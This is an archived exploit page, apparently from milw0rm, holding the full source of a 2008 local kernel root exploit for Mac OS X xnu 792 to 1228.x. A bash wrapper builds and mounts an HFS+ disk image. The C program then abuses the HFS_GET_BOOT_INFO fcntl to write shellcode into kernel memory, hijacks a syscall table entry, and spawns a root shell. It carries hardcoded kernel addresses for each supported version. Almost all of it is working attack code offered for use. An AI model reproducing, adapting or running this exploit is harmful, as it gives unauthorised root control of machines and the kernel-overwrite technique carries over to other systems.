<html><head><title>Mac OS X xnu <= 1228.x (hfs-fcntl) Local Kernel Root Exploit</title></head><pre>#!/bin/bash
# * xnu-hfs-fcntl-v2.sh
# *
# * Copyright (c) 2008 by &lt;mu-b@digit-labs.org&gt;
# *
# * Apple MACOS X 792.0 &lt;= xnu &lt;= 1228.x local kernel root exploit
# * by mu-b - Sat 14 June 2008
# *
# * - Tested on: Apple MACOS X 10.4.8 (xnu-792.14.14.obj~1/RELEASE_I386)
# *              Apple MACOS X 10.4.9 (xnu-792.18.5~1/RELEASE_I386)
# *              Apple MACOS X 10.4.10 (xnu-792.22.5~1/RELEASE_I386)
# *              Apple MACOS X 10.4.11 (xnu-792.25.20~1/RELEASE_I386)
# *              Apple MACOS X 10.5.0 (xnu-1228~1/RELEASE_I386)
# *              Apple MACOS X 10.5.1 (xnu-1228.0.2~1/RELEASE_I386)
# *              Apple MACOS X 10.5.2 (xnu-1228.3.13~1/RELEASE_I386)
# *              Apple MACOS X 10.5.3 (xnu-1228.5.18~1/RELEASE_I386)
# *              Apple MACOS X 10.5.4 (xnu-1228.5.20~1/RELEASE_I386)
# *              Apple MACOS X 10.5.5 (xnu-1228.7.58~1/RELEASE_I386)
# *              Apple MACOS X 10.5.6 (xnu-1228.9.59~1/RELEASE_I386)
# *
# *    - Private Source Code -DO NOT DISTRIBUTE -
# * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
# *

IMAGE=xnu-hfs
EXPFILE=xnu-hfs-fcntl-v2

echo -en &quot;Apple MACOS X xnu &lt;= 1228.x local kernel root exploit\n&quot; \
         &quot;by: &lt;mu-b@digit-labs.org&gt;\n&quot; \
         &quot;http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n&quot;

if [ ! -f $EXPFILE ]; then
  echo -n &quot;* compiling exploit...&quot;
  gcc -Wall $EXPFILE.c -o $EXPFILE 2&gt; /dev/null
  if [ $? != 0 ]; then
    echo &quot; failed&quot;
    exit $?
  else
    echo &quot; done&quot;
  fi
fi

if [ ! -f $IMAGE.dmg ]; then
  echo -n &quot;* creating diskimage...&quot;
  hdiutil create -megabytes 1 -fs HFS+ -volname $IMAGE $IMAGE.dmg &gt; /dev/null
  if [ $? != 0 ]; then
    echo &quot; failed&quot;
    exit $?
  else
    echo &quot; done&quot;
  fi
fi

echo -n &quot;* attaching/mounting diskimage...&quot;
hdiutil attach $IMAGE.dmg &gt; /dev/null
if [ $? != 0 ]; then
  echo &quot; failed&quot;
  exit $?
else
  echo &quot; done&quot;
fi

echo -e &quot;* executing exploit...\n&quot;
./$EXPFILE /Volumes/$IMAGE

echo -n &quot;* detaching/unmounting diskimage...&quot;
hdiutil detach /Volumes/$IMAGE &gt; /dev/null
if [ $? != 0 ]; then
  echo &quot; failed&quot;
  exit $?
else
  echo &quot; done&quot;
fi

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* xnu-hfs-fcntl-v2.c
 *
 * Copyright (c) 2008 by &lt;mu-b@digit-labs.org&gt;
 *
 * Apple MACOS X 792.0 &lt;= xnu &lt;= 1228.x local kernel root exploit
 * by mu-b - Sat 14 June 2008
 *
 * - Tested on: Apple MACOS X 10.4.8 (xnu-792.14.14.obj~1/RELEASE_I386)
 *              Apple MACOS X 10.4.9 (xnu-792.18.5~1/RELEASE_I386)
 *              Apple MACOS X 10.4.10 (xnu-792.22.5~1/RELEASE_I386)
 *              Apple MACOS X 10.4.11 (xnu-792.25.20~1/RELEASE_I386)
 *              Apple MACOS X 10.5.0 (xnu-1228~1/RELEASE_I386)
 *              Apple MACOS X 10.5.1 (xnu-1228.0.2~1/RELEASE_I386)
 *              Apple MACOS X 10.5.2 (xnu-1228.3.13~1/RELEASE_I386)
 *              Apple MACOS X 10.5.3 (xnu-1228.5.18~1/RELEASE_I386)
 *              Apple MACOS X 10.5.4 (xnu-1228.5.20~1/RELEASE_I386)
 *              Apple MACOS X 10.5.5 (xnu-1228.7.58~1/RELEASE_I386)
 *              Apple MACOS X 10.5.6 (xnu-1228.9.59~1/RELEASE_I386)
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/attr.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;sys/utsname.h&gt;
#include &lt;unistd.h&gt;

#define OSX_TIGER           0x04
#define OSX_LEOPARD         0x05

#define HFS_GET_BOOT_INFO   0x00010004
#define SYSCALL_NUM         21
#define TIGER_HIT_ADDY(a)   ((a)+0x20+((sizeof (struct sysent)-sizeof (int))*SYSCALL_NUM))
#define LEOPARD_HIT_ADDY(a) ((a)+0x20+(sizeof (struct sysent)*SYSCALL_NUM))

/* 1228.x, bsd/sys/sysent.h */
struct sysent {
  short sy_narg;
  char  sy_resv;
  char  sy_flags;
  void  *sy_call;
  void  *sy_arg_munge32;
  void  *sy_arg_munge64;
  int   sy_return_type;
  short sy_arg_bytes;
};

static unsigned char ztiger[] =
  &quot;\x55&quot;
  &quot;\x89\xe5&quot;
  &quot;\x8b\x45\x08&quot;
  &quot;\x8b\x40\x08&quot;
  &quot;\xc7\x40\x10\x00\x00\x00\x00&quot;
  &quot;\x31\xc0&quot;
  &quot;\xc9&quot;
  &quot;\xc3&quot;;

static unsigned char zleopard[] =
  &quot;\x55&quot;
  &quot;\x89\xe5&quot;
  &quot;\x8b\x45\x08&quot;
  &quot;\x8b\x40\x64&quot;
  &quot;\xc7\x40\x10\x00\x00\x00\x00&quot;
  &quot;\x31\xc0&quot;
  &quot;\xc9&quot;
  &quot;\xc3&quot;;

static struct targets {
  const char *name;
  int shell_addr;   /* &amp;copyright */
  int sys_addr;     /* &amp;nsysent   */
  const int type;
} targets_t[] = {
  /* tiger */
  { &quot;root:xnu-792.14.14.obj~1/RELEASE_I386&quot;, 0x004518ac, 0x00451920, OSX_TIGER },
  { &quot;root:xnu-792.18.15~1/RELEASE_I386&quot;, 0x004528ec, 0x00452960, OSX_TIGER },
  { &quot;root:xnu-792.22.5~1/RELEASE_I386&quot;, 0x004548ec, 0x00454960, OSX_TIGER },
  { &quot;root:xnu-792.25.20~1/RELEASE_I386&quot;, 0x004548ec, 0x00454960, OSX_TIGER },
  /* leopard */
  { &quot;root:xnu-1228~1/RELEASE_I386&quot;, 0x0050170c, 0x00501780, OSX_LEOPARD },
  { &quot;root:xnu-1228.0.2~1/RELEASE_I386&quot;, 0x0050270c, 0x00502780, OSX_LEOPARD },
  { &quot;root:xnu-1228.3.13~1/RELEASE_I386&quot;, 0x0050470c, 0x00504780, OSX_LEOPARD },
  { &quot;root:xnu-1228.5.18~1/RELEASE_I386&quot;, 0x0050770c, 0x00507780, OSX_LEOPARD },
  { &quot;root:xnu-1228.5.20~1/RELEASE_I386&quot;, 0x0050770c, 0x00507780, OSX_LEOPARD },
  { &quot;root:xnu-1228.7.58~1/RELEASE_I386&quot;, 0x0050770c, 0x00507780, OSX_LEOPARD },
  { &quot;root:xnu-1228.9.59~1/RELEASE_I386&quot;, 0x0050A70c, 0x0050A780, OSX_LEOPARD },
  { NULL, 0, 0, 0 },
};

int
main (int argc, char **argv)
{
  struct utsname p_uname;
  struct sysent fsysent;
  struct attrlist attr;
  char buf_attr[2048], *ptr;
  int shell_addr, sys_addr, sysent_addr;
  int fd, id, i, n, type;

  printf (&quot;Apple MACOS X xnu &lt;= 1228.x local kernel root exploit\n&quot;
          &quot;by: &lt;mu-b@digit-labs.org&gt;\n&quot;
          &quot;http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n&quot;);

  if (argc &lt; 2)
    {
      fprintf (stderr, &quot;Usage: %s &lt;hfs volume&gt;\n&quot;, argv[0]);
      exit (EXIT_FAILURE);
    }

  shell_addr = 0;
  sys_addr = 0;
  type = 0;
  uname (&amp;p_uname);

  ptr = strrchr (p_uname.version, ' ') + 1;
  for (i = 0; targets_t[i].name; i++)
    if (strcmp (targets_t[i].name, ptr) == 0)
      {
        shell_addr = targets_t[i].shell_addr;
        sys_addr = targets_t[i].sys_addr;
        type = targets_t[i].type;
        break;
      }

  if (targets_t[i].name == NULL)
    {
      fprintf (stderr, &quot;%s: unsupported xnu version found :( [%s]\n&quot;,
               argv[0], ptr);
      exit (EXIT_FAILURE);
    }

  printf (&quot;* getattrlist...&quot;);
  fflush (stdout);

  attr.bitmapcount = ATTR_BIT_MAP_COUNT;
  attr.commonattr = ATTR_CMN_FNDRINFO;
  attr.volattr = 0;
  attr.dirattr = 0;
  attr.fileattr = 0;
  attr.forkattr = 0;
  n = getattrlist (argv[1], &amp;attr, (void *) buf_attr, sizeof (buf_attr), 0);
  if (n &lt; 0)
    {
      fprintf (stderr, &quot;\n%s: getattrlist failed\n&quot;, argv[0]);
      exit (EXIT_FAILURE);
    }
  printf (&quot;done\n&quot;);

  printf (&quot;** attrlist length: %d\n&quot;, *(int *) &amp;buf_attr[0]);
  printf (&quot;** fndrinfo: &quot;);
  for (i = 4; i &lt; *(int *) &amp;buf_attr[0]; i++)
    printf (&quot;%c&quot;, buf_attr[i]);
  printf (&quot;\n* done\n\n&quot;);

  if (type == OSX_TIGER)
    memcpy (&amp;buf_attr[4], ztiger, sizeof (ztiger) - 1);
  else if (type == OSX_LEOPARD)
    memcpy (&amp;buf_attr[4], zleopard, sizeof (zleopard) - 1);
  else
    {
      fprintf (stderr, &quot;\n%s: unknown type!\n&quot;, argv[0]);
      exit (EXIT_FAILURE);
    }

  printf (&quot;* setattrlist...&quot;);
  fflush (stdout);

  attr.bitmapcount = ATTR_BIT_MAP_COUNT;
  attr.commonattr = ATTR_CMN_FNDRINFO;
  attr.volattr = ATTR_VOL_INFO;
  attr.dirattr = 0;
  attr.fileattr = 0;
  attr.forkattr = 0;
  n = setattrlist (argv[1], &amp;attr, (void *) &amp;buf_attr[4], sizeof (buf_attr) - 4, 0);
  if (n &lt; 0)
    {
      fprintf (stderr, &quot;\n%s: setattrlist failed\n&quot;, argv[0]);
      exit (EXIT_FAILURE);
    }
  printf (&quot;done\n&quot;);
  sleep (2);

  fd = open (argv[1], O_RDONLY);
  if (fd &lt; 0)
    {
      fprintf (stderr, &quot;%s: open failed\n&quot;, argv[0]);
      exit (EXIT_FAILURE);
    }

  printf (&quot;* overwriting @0x%08X\n&quot;, shell_addr);
  fflush (stdout);

  n = fcntl (fd, HFS_GET_BOOT_INFO, shell_addr);
  if (n &lt; 0)
    {
      fprintf (stderr, &quot;%s: fcntl failed\n&quot;, argv[0]);
      exit (EXIT_FAILURE);
    }
  printf (&quot;* done\n\n&quot;);

  fsysent.sy_narg = 1;
  fsysent.sy_resv = 0;
  fsysent.sy_flags = 0;
  fsysent.sy_call = (void *) shell_addr;
  fsysent.sy_arg_munge32 = NULL;
  fsysent.sy_arg_munge64 = NULL;
  fsysent.sy_return_type = 0;
  fsysent.sy_arg_bytes = 4;
  memcpy (&amp;buf_attr[4], &amp;fsysent, sizeof (struct sysent));

  printf (&quot;* setattrlist...&quot;);
  fflush (stdout);

  attr.bitmapcount = ATTR_BIT_MAP_COUNT;
  attr.commonattr = ATTR_CMN_FNDRINFO;
  attr.volattr = ATTR_VOL_INFO;
  attr.dirattr = 0;
  attr.fileattr = 0;
  attr.forkattr = 0;
  n = setattrlist (argv[1], &amp;attr, (void *) &amp;buf_attr[4], sizeof (buf_attr) - 4, 0);
  if (n &lt; 0)
    {
      fprintf (stderr, &quot;\n%s: setattrlist failed\n&quot;, argv[0]);
      exit (EXIT_FAILURE);
    }
  printf (&quot;done\n&quot;);
  sleep (2);

  if (type == OSX_TIGER)
    sysent_addr = TIGER_HIT_ADDY(sys_addr);
  else if (type == OSX_LEOPARD)
    sysent_addr = LEOPARD_HIT_ADDY(sys_addr);
  else
    {
      fprintf (stderr, &quot;\n%s: unknown type!\n&quot;, argv[0]);
      exit (EXIT_FAILURE);
    }

  printf (&quot;* overwriting @0x%08X\n&quot;, sysent_addr);
  printf (&quot;** sysent[%d].sy_call: 0x%08X\n&quot;, SYSCALL_NUM, shell_addr);
  fflush (stdout);

  n = fcntl (fd, HFS_GET_BOOT_INFO, sysent_addr);
  if (n &lt; 0)
    {
      fprintf (stderr, &quot;%s: fcntl failed\n&quot;, argv[0]);
      exit (EXIT_FAILURE);
    }
  printf (&quot;* done\n\n&quot;);

  printf (&quot;* jumping...&quot;);
  sleep (2);

  n = syscall (SYSCALL_NUM, NULL);
  printf (&quot;done\n\n&quot;);

  id = getuid ();
  printf (&quot;* getuid(): %d\n&quot;, id);
  if (id == 0)
    {
      printf (&quot;+Wh00t\n\n&quot;);

      /* exec shell, for some reason execve doesn't work!?$! */
      system (&quot;/bin/bash&quot;);
    }
  else
    fprintf (stderr, &quot;%s: failed to obtain root :(\n&quot;, argv[0]);

  return (EXIT_SUCCESS);
}

# milw0rm.com [2009-03-23]</pre></html>